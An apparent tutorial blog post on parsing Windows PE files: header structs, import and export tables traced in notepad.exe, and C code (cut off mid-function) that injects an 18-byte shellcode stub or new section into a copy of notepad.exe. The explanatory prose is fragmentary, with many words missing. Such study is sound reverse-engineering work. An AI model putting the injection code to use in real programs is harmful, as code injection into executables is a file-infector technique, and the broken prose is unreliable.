      <title>PE(PE File Parsing)</title>
      <link href="/2023/05/19/PE-FILE/"/>
      <url>/2023/05/19/PE-FILE/</url>
      
        <content type="html"><![CDATA[<h1 id="PE-Portable-Executable-File-Parsing"><a href="#PE-Portable-Executable-File-Parsing" class="headerlink" title="PE(Portable Executable) File Parsing"></a>PE(Portable Executable) File Parsing</h1><p>WIN32 PE</p><p><a href="https://pan.baidu.com/s/1SR6IgJ645IBTPWy3PXNQgQ">https://pan.baidu.com/s/1SR6IgJ645IBTPWy3PXNQgQ</a><br>4veh</p><ul><li>RVARelative Virtual AddressRVA </li><li>RAWRaw DataRAW  PE FOA(file offset address)</li></ul><p><img src="/2023/05/19/PE-FILE/image-20230518235342704.png" alt="image-20230518235342704"></p><h2 id="PE"><a href="#PE" class="headerlink" title="PE"></a>PE</h2><h3 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure><p>64DOS,</p><ul><li>e_magic:dos 4D5A(MZ)</li><li>e_lfanew:NT&#x2F;PE(IMAGE_NT_HEADERS)<ul><li>0DOSMZWindowsDOSWindowsPE</li></ul></li></ul><h3 id="DOS-stub"><a href="#DOS-stub" class="headerlink" title="DOS(stub)"></a>DOS(stub)</h3><p>e_lfanew_IMAGE_DOS_HEADER</p><p>0xd16This program cannot be run in DOS mode.</p><p>dose_cs e_ip</p><h3 id="NT-x2F-PE"><a href="#NT-x2F-PE" class="headerlink" title="NT&#x2F;PE"></a>NT&#x2F;PE</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><h4 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h4><p>PE 0x50450000(PE00)</p><h4 id="PE-IMAGE-FILE-HEADER-FileHeader"><a href="#PE-IMAGE-FILE-HEADER-FileHeader" class="headerlink" title="PE IMAGE_FILE_HEADER FileHeader"></a>PE IMAGE_FILE_HEADER FileHeader</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">    WORD    Machine;                <span class="comment">// </span></span><br><span class="line">    WORD    NumberOfSections;       <span class="comment">// </span></span><br><span class="line">    DWORD   TimeDateStamp;          <span class="comment">// </span></span><br><span class="line">    DWORD   PointerToSymbolTable;   <span class="comment">// COFF</span></span><br><span class="line">    DWORD   NumberOfSymbols;        <span class="comment">// COFF</span></span><br><span class="line">    WORD    SizeOfOptionalHeader;   <span class="comment">// </span></span><br><span class="line">    WORD    Characteristics;        <span class="comment">// </span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><ul><li>Machine<ul><li>PE,CPU</li></ul></li><li>NumberOfSections<ul><li></li></ul></li><li>TimeDateStamp<ul><li>PE</li></ul></li><li>PointerToSymbolTable<ul><li></li></ul></li><li>SizeOfOptionalHeader<ul><li>IMAGE_OPTIONAL_HEADER32</li></ul></li><li>Characteristics<ul><li> dllbitOR</li></ul></li></ul><h4 id="PE-IMAGE-OPTIONAL-HEADER32-OptionalHeader"><a href="#PE-IMAGE-OPTIONAL-HEADER32-OptionalHeader" class="headerlink" title="PE IMAGE_OPTIONAL_HEADER32 OptionalHeader"></a>PE IMAGE_OPTIONAL_HEADER32 OptionalHeader</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   VirtualAddress;     <span class="comment">// </span></span><br><span class="line">    DWORD   Size;               <span class="comment">// </span></span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;                         <span class="comment">// 3264</span></span><br><span class="line">    BYTE    MajorLinkerVersion;            <span class="comment">// </span></span><br><span class="line">    BYTE    MinorLinkerVersion;            <span class="comment">// </span></span><br><span class="line">    DWORD   SizeOfCode;                    <span class="comment">// </span></span><br><span class="line">    DWORD   SizeOfInitializedData;         <span class="comment">// </span></span><br><span class="line">    DWORD   SizeOfUninitializedData;       <span class="comment">// </span></span><br><span class="line">    DWORD   AddressOfEntryPoint;           <span class="comment">// </span></span><br><span class="line">    DWORD   BaseOfCode;                    <span class="comment">// </span></span><br><span class="line">    DWORD   BaseOfData;                    <span class="comment">// PE32</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;                     <span class="comment">// </span></span><br><span class="line">    DWORD   SectionAlignment;              <span class="comment">// </span></span><br><span class="line">    DWORD   FileAlignment;                 <span class="comment">// </span></span><br><span class="line">    WORD    MajorOperatingSystemVersion;   <span class="comment">// </span></span><br><span class="line">    WORD    MinorOperatingSystemVersion;   <span class="comment">// </span></span><br><span class="line">    WORD    MajorImageVersion;             <span class="comment">// </span></span><br><span class="line">    WORD    MinorImageVersion;             <span class="comment">// </span></span><br><span class="line">    WORD    MajorSubsystemVersion;         <span class="comment">// </span></span><br><span class="line">    WORD    MinorSubsystemVersion;         <span class="comment">// </span></span><br><span class="line">    DWORD   Win32VersionValue;             <span class="comment">// Win32</span></span><br><span class="line">    DWORD   SizeOfImage;                   <span class="comment">// </span></span><br><span class="line">    DWORD   SizeOfHeaders;                 <span class="comment">// </span></span><br><span class="line">    DWORD   CheckSum;                      <span class="comment">// </span></span><br><span class="line">    WORD    Subsystem;                     <span class="comment">// </span></span><br><span class="line">    WORD    DllCharacteristics;            <span class="comment">// DLL</span></span><br><span class="line">    DWORD   SizeOfStackReserve;            <span class="comment">// </span></span><br><span class="line">    DWORD   SizeOfStackCommit;             <span class="comment">// </span></span><br><span class="line">    DWORD   SizeOfHeapReserve;             <span class="comment">// </span></span><br><span class="line">    DWORD   SizeOfHeapCommit;              <span class="comment">// </span></span><br><span class="line">    DWORD   LoaderFlags;                   <span class="comment">// </span></span><br><span class="line">    DWORD   NumberOfRvaAndSizes;           <span class="comment">// </span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];   <span class="comment">// </span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32</span><br></pre></td></tr></table></figure><ul><li><p>Magic</p><ul><li>320x10B640x20B</li></ul></li><li><p>AddressOfEntryPoint</p><ul><li>RVA</li></ul></li><li><p>ImageBase</p><ul><li>PEEIPImageBase+AddressOfEntryPoint</li></ul></li><li><p>SizeOfImage</p><ul><li>PE</li></ul></li><li><p>SizeOfHeaders</p><ul><li>PEFileAlignmentsection head</li></ul></li><li><p>Subsystem</p><ul><li></li><li>drive GUI CUI </li></ul></li><li><p>NumberOfRvaAndSizes</p><ul><li>DataDirectory</li></ul></li><li><p>DataDirectory</p><ul><li><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>Export Table</td><td><code>IMAGE_DIRECTORY_ENTRY_EXPORT</code> (0)</td></tr><tr><td>Import Table</td><td><code>IMAGE_DIRECTORY_ENTRY_IMPORT</code> (1)</td></tr><tr><td>Resource Table</td><td><code>IMAGE_DIRECTORY_ENTRY_RESOURCE</code> (2)</td></tr><tr><td>Exception Table</td><td><code>IMAGE_DIRECTORY_ENTRY_EXCEPTION</code> (3)</td></tr><tr><td>Security Table</td><td><code>IMAGE_DIRECTORY_ENTRY_SECURITY</code> (4)</td></tr><tr><td>Base Relocation Table</td><td><code>IMAGE_DIRECTORY_ENTRY_BASERELOC</code> (5)</td></tr><tr><td>Debug Table</td><td><code>IMAGE_DIRECTORY_ENTRY_DEBUG</code> (6)</td></tr><tr><td>Version Information</td><td><code>IMAGE_DIRECTORY_ENTRY_ARCHITECTURE</code> (7)</td></tr><tr><td>Global Pointer</td><td><code>IMAGE_DIRECTORY_ENTRY_GLOBALPTR</code> (8)</td></tr><tr><td>TLSThread Local Storage Table</td><td><code>IMAGE_DIRECTORY_ENTRY_TLS</code> (9)</td></tr><tr><td>Load Configuration Table</td><td><code>IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG</code> (10)</td></tr><tr><td>Bound Import Table</td><td><code>IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT</code> (11)</td></tr><tr><td>IATImport Address Table</td><td><code>IMAGE_DIRECTORY_ENTRY_IAT</code> (12)</td></tr><tr><td>Delay Import Descriptor</td><td><code>IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT</code> (13)</td></tr><tr><td>COMCOM Runtime Descriptor</td><td><code>IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR</code> (14)</td></tr><tr><td>Reserved</td><td><code>IMAGE_DIRECTORY_ENTRY_RESERVED</code> (15)</td></tr></tbody></table></li></ul></li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SIZEOF_SHORT_NAME              8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];   <span class="comment">// 88</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   PhysicalAddress;              <span class="comment">// </span></span><br><span class="line">        DWORD   VirtualSize;                  <span class="comment">// </span></span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD   VirtualAddress;                   <span class="comment">// </span></span><br><span class="line">    DWORD   SizeOfRawData;                     <span class="comment">// </span></span><br><span class="line">    DWORD   PointerToRawData;                  <span class="comment">// </span></span><br><span class="line">    DWORD   PointerToRelocations;              <span class="comment">// </span></span><br><span class="line">    DWORD   PointerToLinenumbers;              <span class="comment">// </span></span><br><span class="line">    WORD    NumberOfRelocations;               <span class="comment">// </span></span><br><span class="line">    WORD    NumberOfLinenumbers;               <span class="comment">// </span></span><br><span class="line">    DWORD   Characteristics;                   <span class="comment">// </span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p>RAW()&#x3D;RVA-VirtualAddress+PointerToRawData</p><blockquote><p>VirtualSizeSizeOfRawData</p></blockquote><p>PE RAW&#x3D;RVA</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>_IMAGE_OPTIONAL_HEADERDataDirectory_IMAGE_IMPORT_DESCRIPTOR</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p><strong>notepad</strong></p><p>&gt;&gt;&gt;<strong>Name</strong></p><p></p><p><img src="/2023/05/19/PE-FILE/image-20230519163927062.png" alt="image-20230519163927062"></p><p>0x7604RVA</p><p><img src="/2023/05/19/PE-FILE/image-20230519164252693.png" alt="image-20230519164252693"></p><p>0x7604section(PEsectionELF)</p><p>RAW&#x3D;RVA-VirtualAddress+PointerToRawData&#x3D;0x7604-0x1000+0x400&#x3D;0x6A04</p><p><img src="/2023/05/19/PE-FILE/image-20230519164805090.png" alt="image-20230519164805090"></p><p>name0x7AACRAW&#x3D;0x7AAC-0x1000+0x400&#x3D;0x6EAC</p><p><img src="/2023/05/19/PE-FILE/image-20230519164941785.png" alt="image-20230519164941785"></p><p><img src="/2023/05/19/PE-FILE/image-20230519165226573.png" alt="image-20230519165226573"></p><p><strong>OriginalFirstThunkFirstThunkINT(Import Name Table ) IATImport Address Table </strong></p><p>&gt;&gt;&gt;<strong>OriginalFirstThunk:INT</strong>()</p><p>_IMAGE_THUNK_DATA32RVA</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD ForwarderString;      <span class="comment">// PBYTE</span></span><br><span class="line">        DWORD Function;             <span class="comment">// PDWORD</span></span><br><span class="line">        DWORD Ordinal;              <span class="comment">// </span></span><br><span class="line">        DWORD AddressOfData;        <span class="comment">//  IMAGE_IMPORT_BY_NAME PIMAGE_IMPORT_BY_NAME</span></span><br><span class="line">    &#125; u1;</span><br><span class="line">&#125; IMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_THUNK_DATA32 * PIMAGE_THUNK_DATA32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;       <span class="comment">// </span></span><br><span class="line">    CHAR   Name[<span class="number">1</span>];    <span class="comment">// NULLASCII</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><blockquote><p>u111OrdinalAddressOfData</p></blockquote><p><img src="/2023/05/19/PE-FILE/image-20230519171519020.png" alt="image-20230519171519020"></p><p>RAW&#x3D;0x6D90 0x6D90_IMAGE_THUNK_DATA32NULL</p><p><img src="/2023/05/19/PE-FILE/image-20230519172810749.png" alt="image-20230519172810749"></p><p>RVA&#x3D;0x7A7A RAW&#x3D;0x6E7A_IMAGE_IMPORT_BY_NAME</p><p><img src="/2023/05/19/PE-FILE/image-20230519172307227.png" alt="image-20230519172307227"></p><p>0xF</p><p>0x7a5e RAW0x6e50</p><p><img src="/2023/05/19/PE-FILE/image-20230519172921483.png" alt="image-20230519172921483"></p><p>&gt;&gt;&gt;<strong>FirstThunk:IAT</strong>()</p><p>_IMAGE_THUNK_DATA32RVA</p><p><img src="/2023/05/19/PE-FILE/image-20230519174316053.png" alt="image-20230519174316053"></p><p>RAW0x6c4</p><p><img src="/2023/05/19/PE-FILE/image-20230519174410251.png" alt="image-20230519174410251"></p><p></p><p>x32dbg</p><blockquote><p>PEimagebase(aslr)IATRVA+ImageBase</p></blockquote><p>RVA+ImageBase&#x3D;0x10012c4</p><p><img src="/2023/05/19/PE-FILE/image-20230519180741267.png" alt="image-20230519180741267"></p><p><img src="/2023/05/19/PE-FILE/image-20230519181813832.png" alt="image-20230519181813832"></p><p>0x77243e60PageSetupDlgw</p><p><img src="/2023/05/19/PE-FILE/image-20230519181542374.png" alt="image-20230519181542374"></p><p><img src="/2023/05/19/PE-FILE/image-20230519180449954.png" alt="image-20230519180449954"></p><p>ELFgot,call *(iat)</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>_IMAGE_OPTIONAL_HEADERDataDirectory</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;        <span class="comment">// </span></span><br><span class="line">    DWORD   TimeDateStamp;          <span class="comment">// </span></span><br><span class="line">    WORD    MajorVersion;           <span class="comment">// </span></span><br><span class="line">    WORD    MinorVersion;           <span class="comment">// </span></span><br><span class="line">    DWORD   Name;                   <span class="comment">//  RVA</span></span><br><span class="line">    DWORD   Base;                   <span class="comment">// </span></span><br><span class="line">    DWORD   NumberOfFunctions;      <span class="comment">// </span></span><br><span class="line">    DWORD   NumberOfNames;          <span class="comment">// </span></span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">//  RVA</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">//  RVA</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">//  RVA</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><blockquote><p>NumberOfFunctions1523 NumberOfFunctions&#x3D;5</p><p></p><p></p></blockquote><p>GetProcAddress</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">FARPROC <span class="title function_">GetProcAddress</span><span class="params">(HMODULE hModule ,LPCWSTR lpPro0cName)</span></span><br></pre></td></tr></table></figure><h4 id="lpPro0cNamename-0x10000"><a href="#lpPro0cNamename-0x10000" class="headerlink" title="lpPro0cNamename 0x10000"></a>lpPro0cNamename 0x10000</h4><ul><li>AddressOfNamesRVA(RVA)strcmpnamed_indexA-Za-z log2(n) :)</li><li>AddressOfNameOrdinalsnamed_indexorinal</li><li>AddressOfFunctions(EAT  Export Address Table)orinalRVA</li></ul><h4 id="lpPro0cName-0x10000"><a href="#lpPro0cName-0x10000" class="headerlink" title="lpPro0cName 0x10000"></a>lpPro0cName 0x10000</h4><ul><li>Baseindex</li><li>index</li></ul><h2 id="some-opertion-about-pe"><a href="#some-opertion-about-pe" class="headerlink" title="some opertion about pe"></a>some opertion about pe</h2><p>main.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;init.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NAME <span class="string">&quot;C:\\Users\\zbx\\Desktop\\notepad.exe&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NEWNAME <span class="string">&quot;new.exe&quot;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[<span class="number">18</span>] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x6A</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6A</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6A</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6A</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xE8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xE9</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">size_t</span> size = <span class="number">18</span>;</span><br><span class="line">DWORD AddNewSectionSize=<span class="number">0x1000</span>;</span><br><span class="line">DWORD ExpandSectionSize = <span class="number">0x1000</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//*********FiletoImageToFile********</span></span><br><span class="line">    <span class="comment">/*void* Filebuffer;</span></span><br><span class="line"><span class="comment">    void* Imagebuffer;</span></span><br><span class="line"><span class="comment">    void* Newfilebuffer;</span></span><br><span class="line"><span class="comment">    size_t size;</span></span><br><span class="line"><span class="comment">    size = PeCopyToFilebuffer(NAME, &amp;Filebuffer);</span></span><br><span class="line"><span class="comment">    FileToImage(Filebuffer, &amp;Imagebuffer);</span></span><br><span class="line"><span class="comment">    ImageToFile(Imagebuffer, &amp;Newfilebuffer);</span></span><br><span class="line"><span class="comment">    FilebufferCopytoPe(NEWNAME, size, Newfilebuffer);</span></span><br><span class="line"><span class="comment">    free(Filebuffer);</span></span><br><span class="line"><span class="comment">    free(Imagebuffer);</span></span><br><span class="line"><span class="comment">    free(Newfilebuffer);</span></span><br><span class="line"><span class="comment">    printf(&quot;get a new one &quot;);*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//********GetMessageBoxA********</span></span><br><span class="line">    <span class="comment">/*size_t size;</span></span><br><span class="line"><span class="comment">    void* filebuffer = NULL;</span></span><br><span class="line"><span class="comment">    size = PeCopyToFilebuffer(NAME, &amp;filebuffer);</span></span><br><span class="line"><span class="comment">    AddShellcode(filebuffer);</span></span><br><span class="line"><span class="comment">    FilebufferCopytoPe(NEWNAME, size, filebuffer);</span></span><br><span class="line"><span class="comment">    free(filebuffer);*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//********AddANewSection*********</span></span><br><span class="line">    <span class="comment">/*void* filebuffer=NULL;</span></span><br><span class="line"><span class="comment">    void* newfilebuffer=NULL;</span></span><br><span class="line"><span class="comment">    size_t size = 0;</span></span><br><span class="line"><span class="comment">    size_t newsize = 0;</span></span><br><span class="line"><span class="comment">    size=PeCopyToFilebuffer(NAME,&amp;filebuffer);</span></span><br><span class="line"><span class="comment">    newsize =AddANewSection(filebuffer,size,&amp;newfilebuffer);</span></span><br><span class="line"><span class="comment">    FilebufferCopytoPe(NEWNAME,newsize,newfilebuffer);</span></span><br><span class="line"><span class="comment">    free(filebuffer);</span></span><br><span class="line"><span class="comment">    free(newfilebuffer);*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//***********ExpandTheLastSection*********</span></span><br><span class="line">    <span class="type">void</span>* filebuffer=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">void</span>* newfilebuffer=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> newsize = <span class="number">0</span>;</span><br><span class="line">    size=PeCopyToFilebuffer(NAME,&amp;filebuffer);</span><br><span class="line">    newsize = ExpandTheLastSection(filebuffer,size,&amp;newfilebuffer);</span><br><span class="line">    FilebufferCopytoPe(NEWNAME,newsize,newfilebuffer);</span><br><span class="line">    <span class="built_in">free</span>(filebuffer);</span><br><span class="line">    <span class="built_in">free</span>(newfilebuffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>init.h</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _FileToimagetofile</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _FileTOimagetofile</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line">DWORD <span class="title function_">PeCopyToFilebuffer</span><span class="params">(IN <span class="type">const</span> <span class="type">char</span>* name, OUT <span class="type">void</span>** pointer)</span>;</span><br><span class="line">DWORD <span class="title function_">FileToImage</span><span class="params">(IN <span class="type">const</span> <span class="type">void</span>* Filept, OUT <span class="type">void</span>** Imagept)</span>;</span><br><span class="line">DWORD <span class="title function_">ImageToFile</span><span class="params">(IN <span class="type">const</span> <span class="type">void</span>* Imagept, OUT <span class="type">void</span>** Filept)</span>;</span><br><span class="line">DWORD <span class="title function_">FilebufferCopytoPe</span><span class="params">(IN <span class="type">const</span> <span class="type">char</span>* name, <span class="type">size_t</span> size, <span class="type">const</span> <span class="type">void</span>* Filept)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">AddANewSection</span><span class="params">(IN <span class="type">void</span> *filebuffer, IN <span class="type">size_t</span> sizeoffilebuffer,OUT <span class="type">void</span> **newfilebuffer)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AddShellcode</span><span class="params">(IN <span class="type">void</span>* filebuffer)</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">ExpandTheLastSection</span><span class="params">(IN <span class="type">void</span> * filebuffer, IN <span class="type">size_t</span> sizeoffilebuffer,OUT <span class="type">void</span> **newfilebuffer)</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>init.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>  _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;init.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG 0</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> shellcode[<span class="number">18</span>];</span><br><span class="line"><span class="keyword">extern</span> <span class="type">size_t</span> size;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">size_t</span> size;</span><br><span class="line"><span class="keyword">extern</span> DWORD AddNewSectionSize;</span><br><span class="line"><span class="keyword">extern</span> DWORD ExpandSectionSize;</span><br><span class="line">DWORD <span class="title function_">PeCopyToFilebuffer</span><span class="params">(IN <span class="type">const</span> <span class="type">char</span>* name, OUT <span class="type">void</span>** pointer)</span> &#123;</span><br><span class="line">    FILE* PE = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">void</span>* Filebuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> size = <span class="number">0</span>;</span><br><span class="line">    DWORD fin;</span><br><span class="line">    PE = fopen(name, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == PE) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;file open PE %s&quot;</span>, name);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fseek(PE, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    size = ftell(PE);</span><br><span class="line">    Filebuffer = <span class="built_in">malloc</span>(size);</span><br><span class="line">    fseek(PE, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    